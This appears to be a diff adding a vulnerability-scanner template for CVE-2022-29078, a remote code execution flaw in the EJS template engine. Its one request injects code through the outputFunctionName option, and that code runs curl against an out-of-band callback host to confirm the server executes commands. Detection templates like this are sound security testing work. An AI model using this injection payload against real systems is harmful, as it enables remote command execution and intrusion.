@@ -1,0 +1,25 @@
+id: CVE-2022-29078
+
+info:
+  name: ejs template injection vulnerability
+  author: Shrinivas
+  severity: CRITICAL
+  description: |
+    Affected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the view options parameter of renderFile,which makes it possible to inject code into outputFunctionName.
+  reference:
+    - https://eslam.io/posts/ejs-server-side-template-injection-rce/
+    
+  tags: rce,oast,cve,cve2022,template injection
+
+requests:
+  - raw:
+      - |
+        GET /page?id=1&settings[view%20options][outputFunctionName]=x;process.mainModule.require('child_process').exec("curl%20http://{{interactsh-url}}");s HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the HTTP Interaction
+        words:
+          - "dns"
